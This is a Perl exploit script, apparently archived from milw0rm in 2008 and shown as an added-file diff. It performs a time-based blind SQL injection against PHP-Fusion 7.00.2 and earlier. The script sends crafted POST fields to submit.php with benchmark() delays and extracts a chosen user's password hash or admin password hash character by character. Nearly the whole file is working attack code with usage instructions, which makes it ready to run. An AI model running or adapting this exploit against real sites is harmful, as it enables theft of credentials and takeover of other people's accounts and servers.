@@ -1,0 +1,110 @@
+#!/usr/bin/perl -w
+# -------------------------------------------------------
+# PHP-Fusion <= 7.00.2 Remote Blind SQL Injection Exploit
+# by athos - staker[at]hotmail[dot]it
+# download on http://php-fusion.co.uk
+# -------------------------------------------------------
+# Usage:
+# perl xpl.pl host/path prefix user_id user_pwd target_id
+# perl xpl.pl localhost/php-fusion fusion 5 anarchy 1
+# -------------------------------------------------------
+# Note: magic_quotes_gpc off && register globals on
+#       don't add me on msn messenger 
+#       my email staker.38@gmail.com
+# 
+# Greetz: str0ke,The:Paradox,darkjoker,Key and #cancer :D 
+# -------------------------------------------------------
+# This is pratically the same vulnerability of 6.01.14
+# version (http://milw0rm.com/exploits/5470) found by 
+# The:Paradox. PHP-Fusion's coder seems not interested in
+# Web Security, isn't him? 
+# -------------------------------------------------------
+# User Password:  my $field = "user_password" ;
+# Admin Password: my $field = "user_admin_password";                   
+# -------------------------------------------------------
+
+use strict;
+use Digest::MD5('md5_hex');
+use LWP::UserAgent;
+
+
+my $field = "user_password";
+my ($stop,$start,$hash);
+
+
+my $domain = shift;
+my $ptable = shift;
+my $ulogin = shift;
+my $plogin = shift;
+my $userid = shift or &usage;
+
+my @chars = (48..57, 97..102); 
+my $substr = 1; 
+my $http = new LWP::UserAgent;
+
+
+
+sub send_request
+{ 
+     my $post = undef;
+     my $host = $domain;
+     my $param = shift @_ or die $!;
+  
+     $host  .= "/submit.php?stype=l";
+
+     $http->default_header('Cookie' => "fusion_user=${ulogin}.".md5_hex($plogin));
+     $post = $http->post('http://'.$host,[
+                                 'link_category'    => 1,
+                                 'link_name'        => 1,
+                                 'link_url'         => 1,
+                                 'link_description' => 1,
+                                 'submit_link'      => 'Submit+Link',
+                                 'submit_info[pwn]' => $param,
+                               ]);
+ 
+}
+
+
+sub give_char
+{
+     my $send = undef;
+     my ($charz,$uidz) = @_;
+  
+     $send = "' or (select if((ascii(substring".
+             "($field,$uidz,1))=$charz),".
+             "benchmark(230000000,char(0)),".
+            "0) from ${ptable}_users where user_id=$userid))#";
+
+     return $send;
+}
+
+
+for(1..32) 
+{
+     foreach my $set(@chars)
+     {
+          my $start = time();
+    
+          send_request(give_char($set,$substr));
+    
+          my $stop = time();
+  
+         if($stop - $start > 6)
+         { 
+              syswrite(STDOUT,chr($set));
+              $substr++; 
+              last;
+        }
+    }
+}
+
+sub usage
+{
+      print "PHP-Fusion <= 7.0.2 Remote Blind SQL Injection Exploit\n";
+      print "by athos - staker[at]hotmail[dot]it\n";
+      print "Usage: perl $0 [host/path] [table prefix] [id] [password] [target id]\n";
+      print "Usage: perl $0 localhost/php-fusion fusion 5 p4ssw0rd 1\n"; 
+      exit; 
+}     
+
+# milw0rm.com [2008-12-24]
